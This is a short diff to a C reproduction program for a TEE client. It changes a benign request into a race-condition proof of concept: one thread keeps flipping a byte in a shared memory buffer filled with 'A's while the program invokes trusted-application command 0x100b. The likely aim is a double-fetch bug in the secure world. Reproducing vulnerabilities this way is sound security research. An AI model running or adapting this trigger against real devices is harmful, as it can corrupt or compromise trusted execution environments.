@@ -4,6 +4,11 @@
 #include "tee_client_api.h"
 #include "repro.h"
 #include <dlfcn.h>
+#include <pthread.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>  
 
 TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
 			     TEEC_Session*,
@@ -17,6 +22,13 @@ void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
 void (*TEEC_CloseSession_impl)(TEEC_Session*);
 TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
 TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+
+void* mod_thread(void* arg){
+    while(1){
+        ((char*)arg)[0x20] = 0;
+        ((char*)arg)[0x20] = 0x41;
+    }
+}
 
 void send_req(TEEC_Context *context, TEEC_Session *session)
 {
@@ -36,8 +48,14 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     op.params[1].tmpref.size =  0x100; 
     op.params[0].value.a = 4;
     op.params[0].value.b = 4;
-
-    strcpy(mem_area2, "hello");
+    
+    memset(mem_area2, 0x41, 0x90);
+    
+    pthread_t tid;
+    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
+        perror("pthread_create failed");
+        return;
+    }
 
     TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x100b, &op, &err_origin);
 }
